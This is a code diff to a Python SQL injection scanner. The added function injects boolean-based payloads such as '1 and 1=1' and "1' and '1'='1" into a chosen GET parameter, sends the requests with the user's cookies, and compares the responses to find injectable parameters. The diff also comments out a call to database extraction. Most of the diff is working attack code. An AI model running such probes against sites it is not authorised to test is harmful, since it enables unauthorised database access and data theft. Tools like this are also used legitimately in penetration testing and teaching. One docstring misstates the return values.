@@ -55,9 +55,55 @@ def check_authentication(url, cookies={'':''}) -> int:
     return 0
 
 
+def first_sql_injection(url, get_param, cookies, injection_type) -> int:
+    '''
+    Identify if it is possible to inject through SQL the GET parameter provided by the user.
+    
+    Arguments:
+        - `url`: site the user wants to access.
+        - `get_param`: GET parameter to check if its injectable.
+        - `cookies`: cookies of the user session to be able to access the URL.
+        - `injection_type`: type of injection to test the SQL injection.
+
+    Returns:
+        - `int`: 0 if the GET parameter provided is injectable, 1 if it is injectable.
+    '''
+    injectable_1 = ''
+    injectable_2 = ''
+
+    if injection_type == 'integers':
+        injectable_1 = '1 and 1=1'
+        injectable_2 = '1 and 1=0'
+    elif injection_type == 'simple_quotes':
+        injectable_1 = "1' and '1'='1"
+        injectable_2 = "1' and '1'='0"
+    elif injection_type == 'double_quotes':
+        injectable_1 = "1\" and \"1\"=\"1"
+        injectable_2 = "1\" and \"1\"=\"0"
+
+    pattern = rf'\?({get_param}\=.+)(\&)'
+    parameter_found = re.search(pattern, url)
+    split_url = url.split(parameter_found.group(1))
+    new_url_1 = split_url[0] + f"{get_param}={injectable_1}" + split_url[1]
+    print(Fore.CYAN + f"Trying with URL: {new_url_1} ...")
+    r_option_1_1 = requests.get(new_url_1, cookies=cookies).text
+    answer_option_1_1 = re.search(rf'<pre>(.+)</pre>', r_option_1_1)
+
+    new_url_2 = split_url[0] + f"{get_param}={injectable_2}" + split_url[1]
+    print(Fore.CYAN + f"Trying with URL: {new_url_2} ...")
+    r_option_1_2 = requests.get(new_url_2, cookies=cookies).text
+    answer_option_1_2 = re.search(rf'<pre>(.+)</pre>', r_option_1_2)
+
+    if answer_option_1_1.group(1) == answer_option_1_2.group(1): 
+        print(Fore.RED + f"Your GET parameter `{get_param}` is not injectable through {injection_type}.")
+        return 1
+    
+    return 0
+
+
 def identify_vulnerability(url, get_param, cookies={'':''}) -> int:
     '''
-    Identify the Blind-based SQL Injection in the given URL, using the given GET parameter and the given cookies, if needed.
+    Identify the SQL Injection in the given URL, using the given GET parameter and the given cookies, if needed.
     
     Arguments:
         - `url`: site the user wants to access.
@@ -65,17 +111,27 @@ def identify_vulnerability(url, get_param, cookies={'':''}) -> int:
         - `cookies`: cookies of the user session to be able to access the URL.
 
     Returns:
-        - `int`: 0 if the URL is vulnerable, 1 if it is not vulnerable to Blind-based SQL injection.
+        - `int`: 0 if the URL is vulnerable, 1 if it is not vulnerable to SQL injection.
     '''
     print(Fore.CYAN + 'Analyzing the URL and the GET parameter you provided ...')
     time.sleep(0.75)
 
-    request_text = requests.get(url, cookies=cookies).text
-    param_pattern = rf'<input.+ name=([\'"]){re.escape(get_param)}\1>'
-    param_found = re.search(param_pattern, request_text)
-    if not param_found:
-        return 1
+    injectable = ''
+    # 1º option: 1 and 1=1 | 1 and 1=0
+    if first_sql_injection(url, get_param, cookies, 'integers') == 0:
+        injectable = 'integers'
+    # 2º option: 1' and '1'='1 | 1' and '1'='0
+    if first_sql_injection(url, get_param, cookies, 'simple_quotes') == 0:
+        injectable = 'simple quotes'
+    # 3º option: 1" and "1"="1 | 1" and "1"="0
+    if first_sql_injection(url, get_param, cookies, 'double_quotes') == 0:
+        injectable = 'double quotes'
     
+    if injectable != '':
+        print(Fore.GREEN + f"Your GET parameter `{get_param}` is injectable through {injectable}!")
+    else:
+        print(Fore.RED + f"Your GET parameter `{get_param}` is not injectable, sorry.")
+        return 1
     return 0
 
 
@@ -161,13 +217,13 @@ def main() -> int:
         if code == 1:
             print(Fore.RED + f"Sorry, the URL you provided is not injectable through the GET parameter `{args.get_param}`")
             return 1
-        print(Fore.GREEN + f"Your URL is vulnerable to Blind SQL Injection and the `{args.get_param}` GET parameter is injectable!\n")
+        print(Fore.GREEN + f"Your URL is vulnerable to SQL Injection!\n")
         
-        '''Extract information from the database (default behaviour).'''
-        # TODO: depending on the input of the user, by default extract databases of the site
-        identify_db(args.url, args.get_param, args.cookies)
+        # '''Extract information from the database (default behaviour).'''
+        # # TODO: depending on the input of the user, by default extract databases of the site
+        # identify_db(args.url, args.get_param, args.cookies)
 
-        print(Fore.GREEN + '\nDatabase recognition finished!!')
+        # print(Fore.GREEN + '\nDatabase recognition finished!!')
     except Exception as err:
         print(Fore.LIGHTRED_EX + f"Unexpected {err=}, {type(err)=}")
         return 1
